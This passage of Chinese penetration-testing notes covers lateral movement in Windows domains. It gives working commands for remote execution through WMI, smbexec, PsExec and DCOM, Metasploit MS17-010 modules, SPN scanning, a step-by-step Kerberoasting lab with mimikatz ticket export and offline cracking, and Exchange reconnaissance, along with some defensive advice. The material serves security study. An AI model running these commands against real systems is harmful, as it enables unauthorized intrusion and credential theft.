使用exploit/windows/smb/psexec\_psh，该版本生成的payload主要是由powershell实现的，该版本的payload比exe版免杀效果好。在实际应用中，攻击者会通过对powershell版本的payload进行混淆来达到绕过杀毒软件的目的。但是，因为Windows7、Windows server 2008及以上版本的操作系统才默认包含powershell，内网中一些机器的操作系统版本可能是xp或者2003,所以攻击者也会使用由exploit/windows/smb/psexec生产的exe版本的payload。

使用exploit/windows/smb/psexec ：

![d4cf510f24516e664ce98629dd60e337.png](image/d4cf510f24516e664ce98629dd60e337.png)

**WMI的使用**

WMI的全名为“ Windows Management Instrumentation"。从Windows 98开始，Windows系统都支持WMI。WMI是由一系列工具集组成的， 可以在本地或者远程管理计算机系统。

自PsExec在内网中被严格监控后，越来越多的反病毒厂商将PsExec加入了黑名单，可以使用WMI进行横向移动。通过渗透测试发现，在使用wmi.exe进行横向移动时，Windows 操作系统默认不会将WMI的操作记录在日志中。因为在这个过程中不会产生日志，所以对网络管理员来说增加了攻击溯源成本。而对攻击者来说，其被发观的可能性有所降低、隐救性有所提高。由此，越来越多的APT开始使用WMI进行攻击。

**基本命令**

在命令行环境中输入如下命令：

```
wmic /node:192.168.111.170 /user:Administrator /password:************** process call create "cmd.exe /c ipconfig >ip.exe"
```

使用目标系统的cmd.exe执行一条命令，将执行结果保存在C盘的ip.exe文件中\(有的路径可能不能写，这里写到桌面了\)

![02480e6ac8df5d4dbc5dcd5f851c23a6.png](image/02480e6ac8df5d4dbc5dcd5f851c23a6.png)

建立ipc$后，使用type命令读取执行结果

```
type \\192.168.111.170\C$\路径\ip.txt
```

![678e728ff9429fa7915d4cbbdab5506a.png](image/678e728ff9429fa7915d4cbbdab5506a.png)

接下来，使用wmic远程执行命令，在远程系统中启动Windows Management Instrumentation服务\(目标服务器需要**开放135 端口**，wmic会以**管理员权限**在远程系统中执行命令）。如果目标服务器**开启了防火墙，wmic 将无法进行连接**。此外，wmic**没有回显**，需要使用**ipc$和type**命令来读取信息。需要注意的是，**如果wmic执行的是恶意程序，将不会留下日志**。

**impacket工具包中的wmiexec**

在KaiLi中下载并安装impacket工具包。输人如下命令，获取目标shell

```
wmiexec.py yokan/administrator:Aa123456@192.168.111.170
```

该方法主要在从Linux向Windows进行横向渗透测试时使用。

**wmiexec.vbs**

wmiexec.vbs脚本通过VBS调用WMI来模拟PsExec的功能。wniexec. vbs可以在远程系统中执行命令并进行回显，获得远程主机的半交互式Shell。 升级版：wmihacker.vbs

输入如下命令，获得一个半交互式的shell

```
cscript.exe //nologo wmiexec.vbs /shell 192.168.111.170 administrator ********
```

![198e11737c29515a0368fdb8bc9c95f2.png](image/198e11737c29515a0368fdb8bc9c95f2.png)

```
csript.exe wmiexec.vbs /cmd 192.168.111.170 administrator ******* "ipconfig" #执行单条命令
```

对于运行时间较长的命令，例如ping、systeminfo,需要添加“**\-wait 5000**”或者更长的时间参数。在运行nc等不需要输出结果但需要一直运行的进程时，如果使用**\-persist** 参数，就不需要使用taskill命令来远程结束进程了。

**Invoke\-WmiCommand**

Invoke\-WmiCommand.ps1脚本包含在PowerSploit工具包中。该脚本主要通过PowerShell调用WMI来远程执行命令，因此本质上还是在利用WMI。

将PowerSploit 的Invoke\-WmiCommand.ps1导人，然后输入如下命令：

```
//目标系统用户名
$User="yokan\Administrator"
//目标系统密码
$Password= ConvertTo-SecureString -String “***********" -AsPlainText -Force
//将账号和密码整合起来，以便导入Credential
$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password
//远程执行命令
$Remote=Invoke-WmiCommand -Payload {ipconfig} -Credential $Cred -ComputerName 192.168.111.170
//将执行结果输出到屏幕上
$Remote.PayloadOutput
```

![a6e2e26f6f952ce5402302c6f94c8c76.png](image/a6e2e26f6f952ce5402302c6f94c8c76.png)

![d3f579fea4a9793c3ddda4e56b7d07de.png](image/d3f579fea4a9793c3ddda4e56b7d07de.png)

**Invoke\-WMIMethod**

利用PowerShell自带的Invoke\-WMIMethod,可以在远程系统中执行命令和指定程序。在PowerShell命令行环境中执行如下命令，可以以**非交互式**的方式执行命令，但不会回显

```
//目标系统用户名
$User="testlab\Administrator"
//目标系统密码
$Password= ConvertTo-SecureString -String "**************" -AsPlainText -Force
//将账号和密码整合起来，以便导入Credential
$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User , $Password
//在远程系统中执行计算器程序
Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList "calc.exe" -ComputerName "192.168.111.170" -Credential $Cred
```

**永恒之蓝漏洞分析与防范**

在2017年4月，轰动网络安全界的事件无疑是，全局\(NSA\)方程式组织\( Equation Group \)使用的极具破坏力的黑客工具，其中包括可以远程攻破约70%的Windows服务器的漏洞利用工具。一夜之间， 全世界70%的Wndows服务器处于危险之中，国内使用Windows服务器的高校、企业甚至政府机构都不能幸免。这无疑是互联网的一次“大地震”，因为已经很久没有出现过像“永恒之蓝”\(MS17.010\) 这种级别的漏洞了。2017年5月12日晚，一款名为 “WannaCry"的蠕虫勒索软件袭击全球网络，影响了近百个国家的上千家企业及公共组织，被认为是当时最大的网络勒索活动。WannaCry利用的是“NSA武器库”中的SMB漏洞。该漏洞通过向Windows服务器的SMBv1服务发送精心构造的命令造成溢出，最终导致任意命令的执行。在Windows操作系统中, SMB服务默认是开启的，监听端口默认

为445，因此该漏洞造成的影响极大。受该漏洞影响的操作系统有Windows NT、Windows 2000、Windows XP、Windows Server 2003、Windows Vista、Windows 7、Windows 8、Windows Server2008、Windows Server 2008 R2、Windows Server 2012R2等。新版本的Mtsploit已经集成了MS17\-010漏洞的测试模块。

Metasploit下的如下两个模块可用于检测和利用：

```
auxiliary/scanner/smb/smb_ms17_010 #检测
exploit/windows/smb/ms17_010_eternalblue  #利用
```

防御“永恒之蓝”漏洞对Windows操作系统的攻击，方法如下。

i）禁用SMB协议\(该方法适用于Windows Vista及更高版本的操作系统\)。

ii）打开Windows Update,或者手动安装KB2919355。

iii）使用防火墙阻止445端口的连接，或者使用进/出站规则阻止445端口的连接。

iv）不要随意打开陌生的文件。

v）安装杀毒软件，及时进行更新病毒库。

**smbexec的使用**

smbexe可以通过文件共享\(admin$ c$ ipc$ d$\)在远程系统中执行命令。

**C\+\+版smbexec**

下载地址：[https://github.com/sunorr/smbexec](https://github.com/sunorr/smbexec)

- **工具说明**

test. exe: 客户端主程序。

execserver.exe: 目标系统中的辅助程序。

常见的smbexec命令如下：

```
test.exe ipaddress username password command netshare
```

- **使用方法**

将execserver.exe上传到目标系统C:\\Windows目录下，解除UAC对命令执行的限制。在命令行环境下执行如下命令

```
net use \\192.168.111.170 "**********" /user:yokan\administrator
copy execserver.exe \\192.168.111.170\c$\windows\
```

接下来在客户端的命令行环境中执行,在使用smbexec时，目标系统的共享必须是开放的\(c$、ipc$、admin$\)

```
test.exe 192.168.111.170 adminstrator ******* whoami c$
```

在使用smbexec时，目标系统的共享必须是开放的\(c$,ipc$,admin$\)

**impacket工具包中的smbexec.py**

Impacket是用于处理网络协议的Python类的集合。

在Kali Linux命令行环境下输入如下命令，会列出相应的工具及用法

```
smbexec.py
```

使用：

```
python3 smbexec.py testlab/Administrator:123456Aa\@1.1.1.10
```

![94c42c620fdee97795c306dff504d24a.png](image/94c42c620fdee97795c306dff504d24a.png)

**Linux跨Windows远程执行命令**

smbexec工具包的下载地址：[https://github.com/brav0hax/smbexec](https://github.com/brav0hax/smbexec)

- **工具安�**�

```
cd /opt
git clone https://github.com/brav0hax/smbexec.git
chmod +x install.sh && ./install.sh
```

安装后输入smbexec,会显示主菜单

- **工具说明**

smbexec的主菜单项有四个，下面分别进行介绍。

![3a17e4f117db25f9aa9283dfaa082584.png](image/3a17e4f117db25f9aa9283dfaa082584.png)

a）主菜单项1

smbexec的主菜单1用于列举系统中的重要信息

![43d86ea4e865abe61cddbbf939e2f009.png](image/43d86ea4e865abe61cddbbf939e2f009.png)

选项1用于扫描目标网络IP地址段中存活的主机。

![a3202cb13397685466e05b1787801f2d.png](image/a3202cb13397685466e05b1787801f2d.png)

选项2用于列举目标系统中的管理员用户。需要输人IP地址、用户名、密码、域四项。IP地址可以直接调用由选项1扫描出来的IP，用户名、密码、域需要手动添加，程序会记录最近输入的用户名密码等以便下次使用

![4a0a04d22d07663ef3ccfd8ada9fceff.png](image/4a0a04d22d07663ef3ccfd8ada9fceff.png)

选项3用于列举当前登录目标系统的用户，用户名、密码、域三项会自动加载最近输人的内容。

![0bdb00091eac3c34f7339f4741147845.png](image/0bdb00091eac3c34f7339f4741147845.png)

选项4用于列举目标系统UAC的状态。在本实验中，目标网络中的两个IP地址所对应的机器的UAC的状态都是Enabled \(启用\)

![c8e2905d064e41dd788b74a3b4c1a948.png](image/c8e2905d064e41dd788b74a3b4c1a948.png)

选项5用于对目标系统中的网络共享目录进行列举。在本实验中，列出了两个IP地址所对应的机器的共享目录

![7d7d0910bec95c5417172efb46624f05.png](image/7d7d0910bec95c5417172efb46624f05.png)

选项6用于在目标系统中搜索敏感文件，例如配置文件、密码信息、缓存文件等

![d6ec02d8114b786c28cb2031ed0cfdbc.png](image/d6ec02d8114b786c28cb2031ed0cfdbc.png)

选项7用于列举远程登录目标主机的用户

![4da2350769ec0e66d507581a6bc36d60.png](image/4da2350769ec0e66d507581a6bc36d60.png)

选项8用于直接返回主菜单

b）主菜单项2

smbexec的主菜单项2用于在目标系统中执行命令、获得权限等

选项1用于生成一个meterpreter Pyload,并在目标系统中直接运行它。在渗透测试中，也可以使用Masploit、Empire、CobaltStike建立一个监听并获得一个shell

![f8649459baf73312603d99566ef93aad.png](image/f8649459baf73312603d99566ef93aad.png)

选项2用于直接关闭远程主机的UAC。网络管理员可以通过攻击者关闭UAC的操作发现系统正在遭受攻击。

选项3的功能是在执行选项2关闭目标系统的UAC后，重新打开目标系统的UAC,使目标系统复原

选项4用于执行一个PowerShell脚本。

选项5使用基于PsExec的方式获得目标系统的一个**System**权限的Shell

**DCOM在远程系统中的使用**

DCOM \(分布式组件对象模型\)是微软的一系列概念和程序接口。通过DCOM,客户端程序对象能够向网络中的另台计算机上的服务器程序对象发送请求。

DCOM是基于组件对象模型\(COM\)的。COM提供了一套允许在同一台计算机上的客户端和服务器之间进行通信的接口\(运行在Windows95及之后版本的操作系统中\)。

攻击者在进行横向移动时，如果要在远程系统中执行命令或payload，除了会使用前面的at、schtasks、 PsExee、 WMI、smbexec 、PowerShell等，还会使用网络环境中部署的大量诸如IPS、流量分析等系统。多了解一些横向移动方法，对日常的系统安全维护是大有益处的。

**通过本地DCOM执行命令**

- **获取DCOM程序列表**

Get\-ClimInstance这个cmdlet \(PowerShel 命令行\)默认只在PowerShell3.0以上版本中存在。也就是说，只有Windows Sever 2012及以上版本的操作系统才可以使用Get\-ClimInstance.命令如下：

```
Get-CimInstance Win32_DCOMApplication
```

![9f0dbe8433791a0d7fe5030880dfab1e.png](image/9f0dbe8433791a0d7fe5030880dfab1e.png)

因为Windows 7、Windows Server 2008中默认安装的是Powershell 2.0，所以它们都不支持Get\-Cimlnstance可以使用如下命令代替Get\-CimInstance

在本地启动一个管理员权限的PowerShell,执行如下命令

```
Get-WmiObject -Namespace ROOT\cimv2 -Class Win32_DCOMApplication
```

![078b8482fb9a08b76d9271a26359b50d.png](image/078b8482fb9a08b76d9271a26359b50d.png)

- **使用DCOM执行任意命令**

本地启动一个**管理员权限**的powershell

```
$com=[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","127.0.0.1"))
$com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c calc.exe","Minimzed")
```

执行完毕，将以当前会话执行Administrator权限的calc.exe

![bb9325d4d1154a7033977739832be54c.png](image/bb9325d4d1154a7033977739832be54c.png)

该方法通过ExecuteShellCommand运行了“计算器”程序。如果攻击者把"计算器"程序换成恶意的payload，就会对系统安全造成威胁。

**使用DCOM在远程机器上执行命令**

下面通过一个实现来讲解如何使用DCOM在远程机器上执行命令。在使用该方法时，需要关闭系统防火墙。在远程机器上执行命令时，必须使用具有管理员权限的账号。

**实验环境**

域控制器：

IP地址：192.168.111.134

域名：yokan.com

用户名：Administrator

密码：\*\*\*\*\*\*\*\*\*\*

成员服务器：

IP地址：192.168.111.130

域名：yokan.com

用户名：Administrator

密码：\*\*\*\*\*\*\*\*\*

- 通过IPC$连接远程计算机

在命令行环境中输入如下命令：

```
net use \\192.168.111.130 "**********" /user:yokan.com\Administrator
```

![07140ce9d7e27be02b0faa99879978de.png](image/07140ce9d7e27be02b0faa99879978de.png)

- 执行命令

i）调用MMC20.Application远程执行命令

建立ipc$后，输入以下命令，在远程计算机上执行calc.exe

```
$com=[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.111.130"))
$com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c calc.exe","")
```

![03f6352cc82fab7c096b530796cfc431.png](image/03f6352cc82fab7c096b530796cfc431.png)

在目标系统中启动 任务管理与，可以看到，calc.exe程序正在运行，启动用户为administrator

![aa293c10346a1d54777fa71ade9e3f64.png](image/aa293c10346a1d54777fa71ade9e3f64.png)

ii）调用9BA05972\-F6A8\-11CF\-A442\-00A0C90A8F39

在远程主机上打开powershell，输入如下命令

```
$com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"192.168.111.130")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.item()
$item.Documnet.Application.ShellExecute("cmd.exe","/c calc.exe","c:\windows\system32",$null,0)
```

即可在远程主机运行calc.exe。

这两种方法均适用于Windows7\-Windows10、Windows server2008\-Windows server 2016

**SPN在域环境中的应用**

Windows域环境是基于微软的活动目录服务工作的，它在网络系统环境中将物理位置分散、所属部门不同的用户进行分组，集中资源，有效地对资源访问控制权限进行细粒度的分配，提高了网络环境的安全性及网络资源统一分配管理的便利性。在域环境中运行的大量应用包含了多种资源,为资源的合理分组、分类和再分配提供了便利。微软给域内的每种资源分配了不同的**服务主体名称**\(Service Principal Name,SPN\)。

**SPN扫描**

- 相关概念

       在使用Kerberos协议进行身份验证的网络中,必须在内置账号\(NetworkService、 LocalSystem\)或者**用户账号**下为服务器注册SPN。对于内置账号，SPN将自动进行注册。但是**如果在域用户账号下运行服务，则必须为要使用的账号手动注册 SPN**。因为域环境中的每台服务器都需要在Kerberos身份验证服务中注册 SPN，所以攻击者会直接向域控制器发送查询请求，获取其需要的服务的SPN,从而知晓其需要使用的服务资源在那台机器上。

      ** Kerberos身份验证便用 SPN将服务实例与服务登录账号关联起来**。如果域中的计算机上安装了多个服务实例，那么每个实例都必须有自己的SPN.如果客户端可能使用多个名称进行身份验证，那么给定的服务实例可以有多个SPN。例如，SPN总是包含运行的服务实例的主机名称，所以，服务实例可以为其所在主机的每个名称或别名注册一个SPN。

       根据Kerberos协议,当输入自己的账号和密码登录活动目录时，域控制器会对账户和密码进行验证。验证通过后，密钥分发中心（KDC\)会将服务授权的譬如票据\(TGT\)发送给用户（作为用户访问资源时的身份凭据）。

       下面通过一个例子来说明。当用户需要访问MSSQL服务时，系统会以当前用户身份向域控制器查询SPN为“MSSQL”的记录。找到该SPN记录后，用户会再次与KDC通信，将KDC发放的TGT作为身份凭据发送给KDC,并将需要访问的SPN发送给KDC。KDC中的身份验证服务\(AS\)对TGT进行解密。确认无误后，由TGT将一张运行访问该SPN所对应的服务的票据和该SPN所对应的服务的地址发送给用户。用户使用该票据即可访问MSSQL服务。

SPN命令的格式如下：

```
SPN = serviceclass "/" hostname [":"port"] ["/" servicename]
serviceclass:服务组件的名称
hostname:以“/”与后边的名称分割，是计算机的FQDN全限定域名，同时带有计算机名和域名
port:以冒号分割，后面的内容为该服务监听的端口号
servicename:一个字符串，可以是服务的专有名称（DN)，objeectGuid,Internet主机名或全限定域名
```

- 常见SPN服务

MSSQL服务的示例代码如下：

```
MSSQLSvc/computer1.pentest.com:1433

MSSQLSvc:服务组件的名称，此处为MSSQL服务
computer1.pentest.com：主机名为computer1，域名为pentest.com
1433：监听的端口为1433
```

serviceclass和hostname是必选参数，port和servicename是可选参数，hostname和port之间的冒号只有在该服务对某端口进行监听时才会使用

Exchange服务的示例代码如下。

```
exchangeMDB/EXCAS01.pentest.com
```

RDP服务的示例代码如下。

```
TERMSERV/EXCAS01.pentest.com
```

WSMan/WinRM/PSRemoting 服务的示例代码如下。

```
WSMAN/EXCAS01.pentest.com
```

- 用于进行SPN扫描的powershell脚本

当计算机加入域时，主SPN会自动添加到域的计算机账号的ServicePrincipalName属性中。在安装新的服务后，SPN也会被记录在计算机账号的相应属性中。

SPN扫描也称作“扫描Kerberos服务实例名称"。**在活动目录中发现服务的最佳方法就是SPN扫描**。SPN扫描通过请求特色SPN类型的服务主题名称来查找服务。与网络端口扫描相比，SPN扫描的主要特点是不需要通过连接网络中的每个IP地址来检查服务端口（不会因触发内网中的IPS、IDS等设备的规则而产生大量的警告日志）。因为SPN查询是Kerberos票据行为的一部分，所以检测难度较大。

Powershell\-AD\-Rccon工具包提供了一系列服务与服务登录账号和运行服务的主机之间的对应关系，这些服务包括但不限于MSSQL、 Exchange. RDP、WinRM。 Powershell\-AD\-Recon工具 [https://github.com/PyroTek3/PowerShell\-AD\-Recon](https://github.com/PyroTek3/PowerShell-AD-Recon)

（1）利用SPN发现域中所有的MSSQL服务

因为SPN是通过LDAP协议向域控制器进行查询的，所以，攻击者只要获得一个普通的域用户权限，就可以进行SPN扫描。

在域中的任意一台机器上，以域用户身份运行一个power shell进程，将脚本导入并执行，命令如下：（Discover\-PSMSSQLServers的下载地址见[https://github.com/PyroTek3/PowerShell\-AD\-Recon/blob/master/Discover\-PSMSSQLServers](https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSSQLServers)）

```
Import-Module .\Discover-PSMsSQLServers.ps1
Discover-PSMSSQLServers
```

（2）扫描域中所有的SPN信息

在域中的任意一台机器上，以域用户的身份运行一个PowerShell进程，将脚本导入并执行，命令如下：

```
Import-Module .\Discover-PSInterestingServices.ps1
Discover-PSInterestingServices
```

可以看到，域中有LDAP、DNS Zone、WSMan、MSSQL等多个SPN。

因为每个重要的服务在域中都有对应的SPN，所以攻击者不必使用复杂的端口扫描技术，只要利用SPN扫描技术就能找到大部分的应用服务器。

Discover\-PSInterestingServices的下载地址：[https://github.com/PyroTek3/PowerShell\-AD\-Recon/blob/master/Discover\-PSInterestingServices](https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSInterestingServices)

![dfa0b66e1e094bcd36bb1b2e4e0dae3d.png](image/dfa0b66e1e094bcd36bb1b2e4e0dae3d.png)

（3）在不使用第三方powershell脚本的情况下，输入命令

```
setspn -T domain -q */* 

setspn -T yokan.com -Q */*
```

即可使用Windows自带的工具列出域内所有的SPN信息。

![9a5f091757cfa200149bc3574f942109.png](image/9a5f091757cfa200149bc3574f942109.png)

**Kerberoast攻击分析与防范**

       Kerberoast是一种针对Kerberos协议的攻击方式。在因为需要使用某个特定资源而向TGS发送Kerberos服务票据的请求时，用户首先需要使用具有有效身份权限的TGT向TGS请求相应服务的票据。当TGT被验证有效且具有该服务的权限时，会向用户发送一张票据。该票据使用与SPN相关联的计算机服务账号的NTLM Hash\(RC4\_HMAC\_MD5\)，也就是说，攻击者会通过kerberoast尝试使用不同的NTLM Hash来打开该Kerberos票据。如果攻击者使用的NTLM Hash是正确的，Kerberos票据就会被打开，而该NTLM Hash对应于该计算机服务账号的密码。

       在域环境中，**攻击者会通过kerberoast使用普通用户权限在活动目录中将计算机服务账号的凭据提取出来**。因为在使用该方法时，大多数操作都是离线完成的，不会向目标系统发送任何信息，所以不会引起安全设备的报警。又因为大多数网络的域环境策略不够严格（没有给计算机服务账户设置密码过期时间；计算机服务账号的权限过高；计算机服务账号的密码与普通域用户账号的密码相同），所以，计算机服务账号的密码很容易受到Kerberoast攻击的影响。

- **实验：配置MSSQL服务，破解该服务的票据**

（1）手动注册SPN

输入如下命令，手动为MSSQL服务账号注册SPN：

```
setspn -A MSSQLSvc/computer1.pentest.com:1433 mssql    (以mssql用户的身份进行SPN服务的注册)
```

（2）查看用户所对应的SPN

```
setspn -L pentest.com\mssql

setspn -T yokan.com -q */*  （查看指定域 yokan.com 注册的SPN, 如果指定域不存在, 则默认切换到查找本域的 SPN）
```

（3）使用adsiedit.msc查看用户SPN及其他高级属性

![ce24865c7d8a3e824241644111aada83.png](image/ce24865c7d8a3e824241644111aada83.png)

（4）配置指定服务的登录权限

```
执行如下命令，在活动目录中为用户配置指定服务的登录权限
gpedit.msc\Computer Configuration\Windows Settings\Security Setting\Local Policies\Users Rights Assignment \Log on as a service
```

（5）**修改加密类型**

因为Kerberos协议的默认加密方式为AES256\_ HMAC,而通过tgsrepcrack.py无法破解该加密方式，所以，攻击者会通过服务器组策略将加密方式设置为RC4 HMAC\_MD5,命令如下

```
gpedit.msc\Computer Configuration\Windows Settings\Security Setting\Local Policies\Security Options\Network security: Configure encryption types allowed for kerberos
```

（6）请求SPN Kerberos票据

打开powershell，输入如下命令：

```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestor SecurityToken -ArgumentList "MSSQLSvc/computer1.labtest.com"
```

（7）导出票据

```
在mimikatz中执行如下命令，将内存中的票据导出
Kerberos::list /export    #票据会导出在当前目录下的kirbi文件中，加密方式为RC4_HMAC_MD5
```

（8）使用kerberoast脚本离线破解票据所对应账号的NTLM Hash

访问 [GitHub \- nidem/kerberoast](https://github.com/nidem/kerberoast)，下载Kerberoast因为该工具是用Python语言编写的，所以需要在本地配置Python2.7环境。

将MSSQL服务所对应的票据文件复制到Kali Linux中。

在Kerberoest中有一个名为gepeack.y的脚本文件，其主要功能是离线破解票据的NTLM Hash在Kai Linux中打开该脚本，在命令行环境中输人如下命令

```
python tgsrepcrack.py wordlist.txt mssql.kirbi
```

如果破解成功，该票据所对应账号的密码将被打印在屏幕上。

- 防范建议

针对kerberoast攻击，有如下防范建议：

（1）防范kerberoast攻击最有效的方法是：确保服务账号密码的长度超过25位；确保密码的随机性；定期修改服务账号的密码

（2）如果攻击者无法将默认的AES256\_HMAC加密方式改为RC4\_HMAC\_MD5，就无法使用tgsrepcrack.py来破解密码

（3）攻击者可以通过嗅探的方法抓取Kerberos TGS票据。因此，如果强制使用AES256\_HMAC方式对Kerberos票据进行加密，那么，即使攻击者获取了Kerberos票据，也无法将其破解，从而保证了活动目录的安全性。

（4）许多服务账户在内网中被分配了过高的权限，且密码强度通常较差。攻击者很可能通过破解票据的密码，从域用户权限提升升到域管理员权限。因此，应该对服务账户的权限进行话当的配置，并提高密码的强度。

（5） 在进行日志审计时，可以重点关注ID为4769 \(请求Krbers服务票据\)的事件。如果有过多的4769日志，应该进一步检查系系统中是否存在恶意行为。

**Exchange邮件服务器安全防范**

Exchange是微软出品的电子邮件服务组件，是一个消息与协作系统。Exchange 在学校和企业中常常作为主要的电子邮件系统使用。Exchange的主要版本有Exchange 2003、Exchange 2007、Exchange 2010、Exchange 2013、Exchange 2016、Exchange 2019。

Exchange服务器可以以本地化的形式部署。也可以以Exchange Online的方式，将Exchange服务器托管在微软云端。Exchange 提供了极强的可扩展性、可靠性、可用性，以及极高的处理性能与安全性能。同时，Exchange 与活动目录、域服务、全局编排目录及微软的其他相关服务和组件有着紧密的联系。

在大型企业中，大多数办公业务都是通过电子邮件系统完成的，电子邮件中可能包含大量的源码、企业内部通讯录、明文密码，敏感业务登录地址及可以从外网访问内网的VPN账户和密码等信息。因此。在对服务器进行安全议置时，定要及时更新Exchange软件的安全补丁和Exchange服务器的安全补丁，有效降低Echage沦陷情况的发生概率。

**Exchange支持PowerShell对其进行本地或远程操作**，这方面方便了运维人员对Exchange的管理和配置，另一方面为攻击者对Exchange进行恶意操作创造了条件。

**Exchange邮件服务器介绍**

- 邮件服务器角色介绍

通过划分不同的服务器角色\( 使它们能执行属于自己的组件和服务\),以及为这些角色设置依存关系，Exchange 将电子邮件处理变成了一个强大、丰富、稳定而又复杂的过程。Exchange在逻辑上分为三层，分别是网络层Network Layer\)、目录层\( DretoryLayer\)。 消息层\(MessgingLayer\)。服务器角色处在消息层。

以Exchange Server 2010版本为例，共有五个服务器角色，分别是邮箱服务器、客户端访问服务器、集线传输服务器、统一消息服务器、边缘传输服务器。其他角色都可以都署在同一台主机上。**邮件服务器，客户端访问服务器，集线传输服务器是核心服务器角色**，只要部署这三个角色就你能提供基本的电子邮件处理功能。

i）邮箱服务器\( Milbox Sver\):提供托管邮箱、 公共文件夹及相关消息数据\(例如地址列表\)的后端组件是必选的服务器角色。

ii）客户端访问服务器\(Cient Acess Sever\):接收和处理来自不同客户端的请求的服务器角色，为通过不同的协议进行的访问提供支持。在一个Exchang环境中，至少需要部署一个客户端访问服务器。

iii）集线传输服务器\(Hub Transport Server \): 也称中心传输服务器。该服务器角色的核心服务就是Microsoft Exchange Transport,负责处理Mail Flow \( Exchange管理员通过Mail Flow实现邮件出站与进站配置\)、对邮件进行路由及在Exchange 组织中进行分发。该服务器角色处理所有发往本地邮箱和外部邮箱的邮件，确保邮件发送者和接收者的地址被正确地解析并能够执行特定的策略\(例如邮件地址过滤、内容过滤、格式转换等\)，同时，可以进行记录、审计、添加免责声明等操作。正如“Hub Transport”的含义，该服务器角色相当于\-一个邮件传输的中继站。在一个Exchange 环境中，至少需要部署一个集线 传输服务器。

iv）统一消息服务器\(Unified Messaging Server \):将专用交换机\( Private Branch Exchange,PBX\)和Exchange服务器集成在一起，允许用户通过邮件发送、存储语音消息和传真消息。该服务器角色为可选角色。

v）边缘传输服务器\( Edge Transport Server\):专用服务器，可用于路由发往内部或外部的邮件，通常部署在网络边界并用于设置安全边界。该服务器角色接收来自内部组织和外部可信服务器的邮件，对这些邮件应用特定的反垃圾邮件、反病毒策略，将通过策略筛选的邮件路由到内部的集线传输服务器上。该服务器角色为可选角色。

- 客户端/远程访问接口和协议

电子邮件通信一般分为邮件发送和邮件接收两个过程。邮件**发送**使用统一的通信协议， 即**SMTP** \(简单邮件传输协议\)。邮件**接收**则会使用**多种协议**标准，例如从POP \(邮局协议\)发展而来的**POP3**，以及使用较为广泛的**IMAP** \(Intemnet邮件访问协议\)。Exchange 开发了私有的IMAP协议\(用于收取邮件\)。新版本的Outlook通常使**MAPI**协议与Exchange进行交互。除此之外，早期的Outlook使用名为“Outlook Anywhere"的RPC进行交互。

Exchange支持的访问接口和协议列举如下：

i）OWA Oulook WebApp\): Exchange提供的Web邮箱

ii）EAC \(Exchange Administrative Center\): Exchange 管理中心，是组织中的Exchange的Web控制台

iii）Outlook Anywhere \( RPC\-over\-HTTP, RPC/HTTP \)。

iv）MAPI \(MAPI\-over\-HTTP, MAPIHTTP \)。

v）Exchange ActiveSync \(EAS, XML/HTTP\)。

vi）Exchange Web Services\(EWS,SOAP\-over\-HTTP\)

**Exchange服务发现**

- 基于端口扫描发现

Exchange作为一个运行在计算机系统中的、为用户提供服务的应用，必然会开放相应的端口\(供多个服务和功能组件实现相互依赖与协调\)。所以，通过端口扫描就能发现内网或公网中开放的Exchange 服务器。

因为具体开放的端口或服务取决于服务器角色，在本节的实验中，使用Nmap进行端口扫描，并通过扫描确认结果

```
nmap -A -O -sV 192.168.111.220
```



使用Nmap端口扫描的方法寻找Exchange服务器，需要与主机进行交互，产生大量的通信流量，造成IDS报警，并在目标服务器中留下大量的日志。因此，关注报警信息、经常查看日志，就可以发现网络系统中存在的异常。

- SPN查询

在安装Exchange 时，SPN就被注册在活动目录中了。在域环境中，可以通过SPN来发现Exchange服务。

获取SPN记录的方法很多，可以使用PowerShell 脚本获取，也可以使用Windows 自带的setspn.exe获取。输人如下命令并执行

```
setspn -T yokan.com -F -Q */*
```

<span style="background-color: #ffaaaa">![1a8b461c3a30c2fc2efb2a6eae133fb1.png](image/1a8b461c3a30c2fc2efb2a6eae133fb1.png)

</span>

其中，exchangeRFR、exchangeAB、exchangeMDB、SMTP、SmtpSvc等都是exchange注册的服务

**Exchange的基础操作**

既然Exchange是一个电子邮件系统，那么其中必然存在数据库。Exchange 数据库的后缀为“**.edb**"，存储在Exchange服务器上。通过Exchange发送、接收、存储的邮件，都会存储在Exchange的数据库中。为了保证可用性，Exchange 的运行一般需要两台以上的服务器。使用PowerShell可以查看Exchange数据库的信息。

- 查看邮件数据库

使用\-Sever参数，可以在指定服务器上进行查询。由于本节的实验环境为本地计算机，为了演示方便，只有一台服务器供Exchange使用。

在PowerShel命令行环境中输人如下命令

```
Get-MailboxDatabase -server "SERVER2012"
```



在正常的Powershell中没有这条命令，需要输入如下命令，**将Exchange管理单元添加到当前会话中**。

```
add-pssnapin microsoft.exchange*
```

可以指定一个数据库，对其详细信息进行查询。例如，输入如下命令，查询数据库的物理路径

```
Get-MailboxDatebase -Identity 'Mailbox Database 00000001' | Format-List Name,EdbFilePath,LogFolderPath
```

其中，'Mailbox Database 00000001'为Get\-MailboxDatebase获取的数据库的名称

- 获取现有用户的邮件地址

使用PowerShell进行查询，列举Exchange中所有的用户及其邮件地址

```
Get-Mailbox | format-tables Name,WindowsEmailAddress
```

- 查看指定用户的邮箱使用信息

输人如下命令，查看指定用户使用的邮箱空间和最后登录时间

```
C:\Windows\system32>get-mailboxstatistics -identity administrator | Select DisplayName,ItemCount,TotalItemSize,LastLogonTime
```

- 获取用户邮箱中的邮件数量

使用PowerShell 获取用户邮箱中的邮件数量及用户的最后登录时间。

```
Get-Mailbox -ResultSize Unlimited | Get-MailboxStatistics | Sort-Object TotalItemSize -Descend
```

使用该命令还可以列出哪些用户没有使用过Exchange邮件系统

**导出指定的电子邮件**

